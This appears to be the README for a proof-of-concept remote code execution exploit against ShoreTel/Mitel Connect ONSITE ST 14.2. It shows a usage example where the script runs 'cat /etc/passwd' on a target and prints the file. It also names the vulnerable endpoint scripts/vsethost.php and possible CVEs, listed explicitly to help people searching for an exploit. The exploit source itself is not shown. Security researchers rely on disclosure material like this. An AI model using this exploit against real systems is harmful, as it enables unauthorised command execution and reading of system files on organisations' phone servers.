# ShoreTel / Mitel Remote Code Execution
## Issue Explanation
There are multiple vulnerabilities in ShoreTel/Mitel Connect ONSITE ST 14.2 which, when chained together, result in remote code execution.

## Usage Example
Not sure this is really needed but I’ll include it anyway. 
```
# ./shoretel_rce.rb https://domain.com/ "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
<-- SNIP -->
```

### Caveat
I had access to a single device during the development of this PoC. As such, your system paths may be different and you may need to edit this script to fit your needs.

## Keywords for Search Engines
I am just adding this section to assist other people who are looking for an exploit.

* ShoreTel Version 19.49.5200.0 GA27 GA28
* CVE-2018-5782 (maybe)
* CVE-2017-16251 (maybe)
* ShoreTel Connect ONSITE ST 14.2 Remote Code Execution
* scripts/vsethost.php
